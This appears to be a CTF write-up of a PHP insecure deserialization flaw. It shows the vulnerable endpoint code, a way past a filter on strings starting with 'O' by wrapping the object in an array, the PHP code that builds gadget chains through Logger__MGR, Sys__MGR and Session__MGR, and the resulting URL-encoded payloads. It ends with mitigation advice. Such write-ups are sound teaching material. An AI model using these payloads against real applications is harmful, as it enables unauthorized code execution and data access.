During reconnaissance **/robots.txt** was found with **/supersecret.php** endpoint  

```
$deser=$_GET['deser'];
if($deser){
  if(substr($deser, 0,1)=="O"){
    die('objects prohinited!');
  }else{
    var_dump(unserialize($deser));
  }
}else{
  highlight_file(__FILE__);
}
```

By passing seriliazed object through deser parameter it is possible to make gadget chain .  

**Example of serialized object**  
> O:8:"Sys__MGR":2:{s:3:"cmd";s:27:"curl http://127.0.0.1:1001/";s:7:"message";s:5:"hello";}  

But since our string can't start with O, we can't insert it directly, but this can easily be done by wrapping it in array.  

**PoC:**  

**To exploit Sys_MGR()**  

Correct constructed payload was achieved by following PHP object chain:  
```
$sys = new Sys__MGR();
$ref = new refClass($sys);
$prop = $ref->getProperty('cmd');
$prop->setAccessible(true);
$prop->setValue($sys, 'id');

$logger = new Logger__MGR();
$logger->logger = $sys;

$payload = array($logger); 

echo urlencode(serialize($payload));
```

**As output we got**  
> a%3A1%3A%7Bi%3A0%3BO%3A11%3A%22Logger__MGR%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A8%3A%22Sys__MGR%22%3A2%3A%7Bs%3A13%3A%22%00Sys__MGR%00cmd%22%3Bs%3A27%3A%22curl+http%3A%2F%2F127.0.0.1%3A1001%2F%22%3Bs%3A7%3A%22message%22%3BN%3B%7D%7D%7D  
![Sys_MGR](../images/sys.jpg)

Unfortunately, we were unable to obtain RCE because in 7.0-8.0 versions of PHP __wakeup() calls every time deserialization, and immideatly throws **Exception**. However even though __wakeup() threw an exception, we observed that echo 'hellow' (from close()) still appeared in the output — suggesting that Logger__MGR::__destruct() was triggered, and it attempted to call $logger->close().  

Since Sys__MGR::__wakeup() failed, the object was likely partially constructed, but enough to trigger close() — and echo 'hellow' worked, even though system($cmd) never ran.  

**To exploit Session__MGR()**  

But we have second class with some flag (I guess CTF task).  
Same logic goes here, but instead of creating Sys__MGR object we create Session_MGR object  

```
$sys = new Session__MGR();


$logger = new Logger__MGR();
$logger->logger = $sys;

$payload = array($logger);

echo urlencode(serialize($payload));
```
**Final payload:**  
> a%3A1%3A%7Bi%3A0%3BO%3A11%3A"Logger__MGR"%3A1%3A%7Bs%3A6%3A"logger"%3BO%3A12%3A"Session__MGR"%3A1%3A%7Bs%3A17%3A"%00Session__MGR%00key"%3Bs%3A4%3A"flag"%3B%7D%7D%7D  

![Logger](../images/logger.jpg)



**Mitigation**  
In order to avoid such vulnerabilities, **never unserialize user input** or use of **allowed_classes**  
 

